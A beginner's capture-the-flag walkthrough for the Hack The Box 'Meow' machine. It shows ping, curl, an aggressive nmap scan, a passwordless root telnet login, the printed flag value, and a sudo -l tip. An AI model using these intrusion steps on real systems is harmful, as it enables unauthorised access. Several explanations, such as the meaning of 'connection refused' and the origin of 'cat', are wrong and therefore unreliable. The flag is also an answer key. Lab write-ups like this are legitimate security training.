─$ ping -c3 10.129.72.233
PING 10.129.72.233 (10.129.72.233) 56(84) bytes of data.

lets start with pinging the server.... we enter in ping with the switch c3 to indicate we only want to ping the IP 3 times and then stop....

--- 10.129.72.233 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 131.819/134.888/139.839/3.534 ms


Next lets try to bring up the site using Curl command which stands for Client URL, it shows you in plaintext the data being received from the webpage

└─$ curl -vv 10.129.72.233
(-vv stands for verbose mode times 2x, makes the tool spit back out information as it comes in)

we get this in return
*   Trying 10.129.72.233:80...
* connect to 10.129.72.233 port 80 failed: Connection refused
* Failed to connect to 10.129.72.233 port 80 after 263 ms: Connection refused
* Closing connection 0
curl: (7) Failed to connect to 10.129.72.233 port 80 after 263 ms: Connection refused


hmmmmm  we get a connection refusal to port 80, which means the connection is present but we do not have the permission to enter....

lets start a nmaping scan with

└─$ nmap -vv -A -T4 10.129.72.233      
(-vv stands for verbose mode, T4 means to go super quickly, remember that T4 is faster than T3, and -A stands for "aggressive mode" which will scan for Operating System detection if it is Linux or Windows for example. 
-A will also give us the service version from ports, trace route of the data and finally it will also give us default script scanning)

The only thing we get back of note from our NMAP is this...

Scanning 10.129.72.233 [1000 ports]
Discovered open port 23/tcp on 10.129.72.233

we see a TCP connection on port 23, which is running Telnet. Telnet is an early poineer of network communication that runs on port 23.
It is not regularly used because of its vulnerabilities.


23/tcp open  telnet  syn-ack Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


We always read from left to right, like a complier, and notice that the machine is running Linux.


If you are completely lost this guide will help immensely.

https://linuxconfig.org/how-to-install-and-use-telnet-on-kali-linux

Essentially, Telnet is very straight forward and allows for open communication between two computers. 
It was built with ease in mind and not security. Therefore the usage is very simple in your terminal enter the following.

└─$ telnet 10.129.72.233

wait a few seconds as the connection establishes itself.....

we will just try to log in as root or anonymous
Trying 10.129.72.233...
Connected to 10.129.72.233.

Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

and Viola! our first guess is root and we log in without a password!!

this is the issue of telnet, it is unencrypted data that allows for easy access. If you see a server running Telnet, 
call the people behind it and ask them how the 90's are currently doing. 

anyways..

Let us list the current space we occupy in the server with the Linux command "ls" which stands for "list" it will output the current directory..

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# ls
flag.txt  snap
root@Meow:~#

we see the flag.txt file....

lets see into that flag.txt file shall we....

lets use the command cat (stands for concatenate, its origin is Latin, it means to link together to chain together)

root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~#


viola, copy and paste the flag into the HTB question....

now just as a hint for future boxes and hacking endeavors when entering any server that is Linux, the command sudo -l will be your friend.

root@Meow:~# sudo -l
Matching Defaults entries for root on Meow:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on Meow:
    (ALL : ALL) ALL
root@Meow:~#


it will list all sudo entries (super user) or rather the commands as super user you currently have access to.


This is not important for the MEOW box, but will be much later in your hacking career.
